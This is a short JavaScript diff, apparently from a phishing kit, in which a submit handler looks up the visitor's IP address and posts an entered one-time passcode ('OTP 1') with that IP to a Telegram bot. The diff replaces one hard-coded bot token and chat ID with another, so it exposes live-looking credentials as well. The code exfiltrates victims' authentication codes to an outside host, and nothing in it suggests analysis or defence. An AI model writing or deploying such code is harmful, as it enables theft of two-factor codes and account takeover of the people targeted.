@@ -8,13 +8,13 @@ document.getElementById('submitButton').addEventListener('click', async function
     const ipData = await ipResponse.json();
     const clientIP = ipData.ip;
 
-    const response = await fetch('https://api.telegram.org/bot6376772615:AAFV14FNDqb2_5HFigeGnXzi_kIZGWjxHeI/sendMessage', {
+    const response = await fetch('https://api.telegram.org/bot6321112055:AAF4EhlpfCSqNMqRqo20ffg5D7s6hEfBp6k/sendMessage', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-            chat_id: '-913533320',
+            chat_id: '-933653021',
             text: `-------[OTP 1 ]-------
 OTP 1: ${formData.get('otp')}
 IP: ${clientIP}`,
